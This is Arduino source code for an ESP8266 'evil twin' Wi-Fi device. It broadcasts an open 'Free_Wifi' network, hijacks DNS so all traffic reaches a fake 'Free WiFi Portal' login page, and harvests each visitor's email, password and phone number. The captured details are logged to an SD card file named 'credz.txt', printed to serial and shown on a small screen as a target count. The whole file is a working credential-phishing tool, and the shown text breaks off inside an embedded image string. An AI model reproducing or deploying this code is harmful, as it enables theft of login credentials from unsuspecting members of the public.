#include <Arduino.h>
#include <U8g2lib.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include "notes.h"


#include <SPI.h>
#include <SD.h>


#ifdef U8X8_HAVE_HW_I2C
#include <Wire.h>
#endif

IPAddress local_IP(192,168,0,1);
IPAddress gateway(192,168,0,1);
IPAddress subnet(255,255,255,0);

DNSServer dnsServer;
ESP8266WebServer server(80);

const int buzzer = 15;
bool buzzerStatus = true;

U8G2_SSD1306_128X32_UNIVISION_F_HW_I2C u8g2(U8G2_R0, /* reset=*/ U8X8_PIN_NONE);
ADC_MODE(ADC_VCC);

const int chipSelect = 1;
File myFile;

int loginAttempts = 0;
String email = "";
String password = "";
String Mobile = "";

//logo-----------------------------


#define u8g2_logo_width 128
#define u8g2_logo_height 32
static unsigned char u8g2_logo_bits[] U8X8_PROGMEM = {
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFE,0xFF,0x03,
0x00,0xFE,0xFF,0xFC,0xF1,0x07,0x78,0x86,0x3F,0x3F,0x00,0x00,0x00,0xFF,0xFF,0x07,
0x00,0xFE,0xFF,0xFC,0xF1,0x07,0xFE,0x8E,0x1F,0x3F,0x00,0x00,0x80,0xFF,0xFF,0x0F,
0x00,0x78,0xE0,0x70,0xE0,0x81,0xFF,0x07,0x07,0x0E,0x00,0x00,0xC0,0xFF,0xFF,0x0F,
0x00,0x38,0xE0,0x70,0xE0,0xC1,0xC7,0x07,0x07,0x07,0x00,0x00,0xC0,0xFF,0xFF,0x0F,
0x00,0x38,0x60,0x70,0xE0,0xE0,0x01,0x07,0x87,0x03,0x00,0x00,0xC0,0xFF,0xFF,0x0F,
0x00,0x3C,0x66,0x78,0xF0,0xE0,0x00,0x86,0xE7,0x01,0x00,0x00,0xC0,0xFF,0xFF,0x1F,
0x00,0x1C,0x06,0x78,0xF0,0xF0,0x00,0x86,0xF3,0x00,0x00,0x00,0xE0,0xFF,0xFF,0x1F,
0x00,0x1C,0x07,0x38,0xF0,0x70,0x00,0x80,0x7F,0x00,0x00,0x00,0xE0,0xFF,0xFF,0x1F,
0x00,0xFC,0x03,0x3C,0xF0,0x70,0x00,0x80,0x3F,0x00,0x00,0x00,0xE0,0xFF,0xFF,0x1F,
0x00,0xFC,0x03,0x3C,0xF0,0x78,0x00,0x80,0x3F,0x00,0x00,0x00,0xF0,0xFF,0xFF,0x1F,
0x00,0x1C,0x03,0x1C,0x70,0x78,0x00,0xC0,0x73,0x00,0x00,0x00,0xF0,0xFF,0xFF,0x1F,
0x00,0x1E,0x03,0x1C,0x70,0x78,0x00,0xC0,0x71,0x00,0x80,0x00,0x70,0x83,0x0F,0x16,
0x00,0x1E,0x00,0x1C,0x78,0xF0,0x80,0xC1,0xE1,0x00,0x80,0x01,0x60,0x00,0x07,0x10,
0x00,0x1E,0x00,0x3C,0x38,0xF0,0x81,0xC1,0xE1,0x00,0x80,0x01,0xC0,0x00,0x07,0x18,
0x00,0x0E,0x00,0x3C,0x3E,0xF0,0xF1,0xC1,0xE1,0x01,0x80,0x01,0xC0,0x00,0x03,0x1C,
0x00,0x0E,0x00,0xF8,0x1F,0xE0,0xFF,0xC1,0xC1,0x01,0xC0,0x01,0xC0,0xC0,0x07,0x0C,
0xC0,0x3F,0x00,0xF0,0x07,0xC0,0x7F,0xF0,0xC7,0x0F,0x80,0x01,0x80,0xC0,0x07,0x04,
0xC0,0x3F,0x00,0xE0,0x03,0x00,0x1F,0xF0,0x87,0x0F,0x40,0x01,0xA0,0xF6,0x3E,0x16,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x03,0x40,0xFF,0xFE,0x1A,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x03,0xC0,0x7F,0xFC,0x0F,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x03,0x80,0x3F,0xF9,0x07,
0x80,0x03,0xDC,0x01,0x0F,0xF0,0x03,0x7E,0xC0,0x18,0x80,0x02,0x00,0x3F,0xF9,0x03,
0xC0,0x07,0xD8,0x80,0x1F,0xD0,0x02,0x4C,0x80,0x0D,0x00,0x46,0x00,0x7E,0x7B,0x01,
0xC0,0x00,0x50,0x80,0x01,0xD0,0x02,0x2C,0x80,0x0F,0x90,0x9B,0x00,0xFE,0xFF,0x01,
0x80,0x03,0x70,0x00,0x0F,0xC0,0x00,0x3C,0x80,0x0A,0xD8,0xB7,0x01,0xFE,0x6F,0x01,
0x00,0x06,0x20,0x00,0x18,0xC0,0x00,0x2C,0x80,0x0A,0x98,0xB4,0x01,0xAE,0xAA,0x01,
0xC0,0x07,0x20,0x80,0x1F,0xC0,0x00,0x4C,0x80,0x08,0x4E,0xB5,0x01,0xA4,0x8B,0x01,
0x80,0x03,0x70,0x00,0x0F,0xE0,0x01,0x7E,0xC0,0x1D,0x66,0xB1,0x01,0x8C,0xC9,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x26,0xBA,0x00,0x1C,0x60,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x26,0x5F,0x00,0xBC,0xF6,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x6C,0xF7,0x00,0xF8,0x7F,0x00,

};

//logo end-----------------------------

void setup() {
  Serial.begin(9600);
  u8g2.begin();
  u8g2.enableUTF8Print();
  


  u8g2.firstPage();
  do {
    u8g2.setFont(u8g2_font_ncenB10_tr);
    u8g2.drawXBMP(0,0, u8g2_logo_width, u8g2_logo_height, u8g2_logo_bits);
  } while ( u8g2.nextPage() );

  delay(2000);

    u8g2.clearBuffer();


  u8g2.drawStr(0,22,"GHOST HUNTER");
  u8g2.sendBuffer();
  delay(1500);
  u8g2.clearBuffer();
  u8g2.drawStr(0,22,"SV404 PROJECT");
  u8g2.sendBuffer();
  delay(1000);
  u8g2.clearBuffer();
  
  
  u8g2.drawStr(0,20,"Initial SD card...");
  u8g2.sendBuffer();
  delay(1000);
  u8g2.clearBuffer();
  
  Serial.print("Initializing SD card...");
  
  //выполняем вывод надписи на экран при отсутствии СД карты 
  delay(1000);
  if (!SD.begin(chipSelect)) {
    Serial.println("initialization failed!");
    u8g2.drawStr(0,20,"Insert SD card !!!");
    u8g2.sendBuffer();

    
  delay(500);
    u8g2.clearBuffer();
// звуковое оповещение при отсутствии карты памяти
    tone(buzzer, NOTE_A7); delay(100);
  tone(buzzer, NOTE_C7); delay(100);
  tone(buzzer, NOTE_A7); delay(100);
  tone(buzzer, NOTE_C7); delay(100);
  tone(buzzer, NOTE_A7); delay(100);
  tone(buzzer, NOTE_C7); delay(100);
   
  noTone(buzzer);
   
  delay(1000);

  // конец вывода и чистим экран
 
  //return;
 }   
  Serial.println("initialization done.");
  
  
  if( SD.exists("buzzer") ){ buzzerStatus = true; }
  swapBuzzer();
  


  Serial.print("Setting soft-AP configuration ... ");
  u8g2.drawStr(0,20,"Startig WIFI...");
  u8g2.sendBuffer();
  delay(1000);
  u8g2.clearBuffer();
  
  Serial.println(WiFi.softAPConfig(local_IP, gateway, subnet) ? "Ready" : "Failed!");
  Serial.print("Setting soft-AP ... ");
  Serial.println(WiFi.softAP("Free_Wifi", "", 1, false, 6) ? "Ready" : "Failed!");
  Serial.print("Soft-AP IP address = ");
  Serial.println(WiFi.softAPIP());
  
  server.on("/", httpHome);
  server.on("/login", httpLogin);
  server.on("/register", httpRegister);
  server.onNotFound(httpDefault);
  if (server.hostHeader() == String("freewifi.lan")) {
    return httpHome();
  }
  server.begin();

  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(53, "*", local_IP);

  pinMode(buzzer, OUTPUT); 
  Serial.println("Setup done");
  u8g2.drawStr(0,20,"SETUP DONE");
  u8g2.sendBuffer();
  delay(1000);
  u8g2.clearBuffer();
  Serial.println(WiFi.softAPIP());

  
  doubleBuzz();   

  getBatteryLevel();
  
  delay(100);
}

void doubleBuzz(){
  if(buzzerStatus == true){
   tone(buzzer, NOTE_A7); delay(100);
  tone(buzzer, NOTE_G7); delay(100);
  tone(buzzer, NOTE_E7); delay(100); 
  tone(buzzer, NOTE_C7); delay(100);  
  tone(buzzer, NOTE_D7); delay(100); 
  tone(buzzer, NOTE_B7); delay(100); 
  tone(buzzer, NOTE_F7); delay(100); 
  tone(buzzer, NOTE_C7); delay(100);
  noTone(buzzer);  
  }
}

void Sd_ErrorBeep() {  // звук "ERROR"
  for (int j=0; j <3; j++){
    for (int i=1000; i<2000; i=i*1.1) { tone(buzzer, i); delay(10); }
    delay(50);
    for (int i=1000; i>500; i=i*1.9) { tone(buzzer, i); delay(10); }
    delay(50);
  noTone(buzzer);
  delay(1000);
  }
}
void buzzerIcon(){
  if(buzzerStatus){
    u8g2.setFont(u8g2_font_6x10_mf);
    u8g2.drawStr(118, 10, ">");  
  }
}
void swapBuzzer(){
  if(buzzerStatus){
    SD.remove("Sd_ErrorBeep()");
  }else{
    myFile = SD.open("buzzer", FILE_WRITE);
    myFile.print("Buzzer Enabled");
    myFile.close();
  } 
}

int getBatteryLevel() { 
  uint32_t getVcc = ESP.getVcc();
  //Serial.println(getVcc);
  float measuredvbat = getVcc; // for actual voltage
  measuredvbat /= 1024; // convert to voltage 
  //Serial.println(measuredvbat);

  int percent = map(getVcc, 2300, 3000, 0, 100); // turn vcc into batt percentage (yea I know it's not that accurate due to dropoff rate)
  return percent; 
  //return random(10,90); //DEBUG
}

void battSideBar(int percent){
  percent = map(percent, 0, 100, 1, 32);
  if(percent > 32){ percent = 32; }
  if(percent < 1){ percent = 1; }

  u8g2.drawLine(124, 32-percent,124, 32);

  u8g2.drawLine(127, 0, 127, 32);   // vert line
  u8g2.drawLine(126, 0, 127, 0);    // top marker (100%)
  u8g2.drawLine(126, 8, 127, 8);    // (75%)
  u8g2.drawLine(126, 16, 127, 16);  // middle marker (50%)
  u8g2.drawLine(126, 24, 127, 24);  //(25%)
  u8g2.drawLine(126, 31, 127, 31);  // botttom marker (0%)
}

int noConnected(){
  int conns = WiFi.softAPgetStationNum();
  
  String connStr = "";
  connStr += conns;
  connStr += "/6";
  char connChr[connStr.length()+1]; 
  connStr.toCharArray(connChr, connStr.length()+1);

  u8g2.setFont(u8g2_font_6x10_mf);
  u8g2.drawStr(100,21,connChr);
}

int noAttempts(){
  String atmpStr = "target:";
  atmpStr += loginAttempts;
  char atmpChr[atmpStr.length()+1]; 
  atmpStr.toCharArray(atmpChr, atmpStr.length()+1);

  u8g2.setFont(u8g2_font_6x10_mf);
  u8g2.drawStr(70,32,atmpChr);
}

void creds(){  
  char emailChr[email.length()+1];
  email.toCharArray(emailChr, email.length()+1);
  u8g2.setFont(u8g2_font_6x10_mf);
  u8g2.drawStr(0,10,emailChr);

  char passwordChr[password.length()+1];
  password.toCharArray(passwordChr, password.length()+1);
  u8g2.setFont(u8g2_font_6x10_mf);
  u8g2.drawStr(0,21,passwordChr);

  char MobileChr[Mobile.length()+1];
  Mobile.toCharArray(MobileChr, Mobile.length()+1);
  u8g2.setFont(u8g2_font_6x10_mf);
  u8g2.drawStr(0,32,MobileChr);
}

void httpDefault(){
  server.sendHeader("Location", "http://freewifi.lan", true);
  server.send(302, "text/plain", "");
  server.client().stop();
}

void httpHome(){
  server.send(200, "text/html", SendHTML(false,false));
}
void httpLogin(){
  server.send(200, "text/html", SendHTML(true,false));
}
void httpRegister(){
  loginAttempts += 1;
  email = server.arg("email");
  password = server.arg("pass");
  Mobile = server.arg("no");
  
  Serial.println(email);
  Serial.println(password);
  Serial.println(Mobile);

  myFile = SD.open("credz.txt", FILE_WRITE);
  myFile.print(email);
  myFile.print(":");
  myFile.print(password);
  myFile.print(":");
  myFile.println(Mobile);
  myFile.close();

  doubleBuzz(); 
  
  server.send(200, "text/html", SendHTML(false,true));
}

String SendHTML(uint8_t login,uint8_t reg){
  String page = "<head><title>Free WiFi Portal</title></head><body><center><div style=\"text-align:center;width:300px\">";
  page += "<img src=\"data:image/png;base64, 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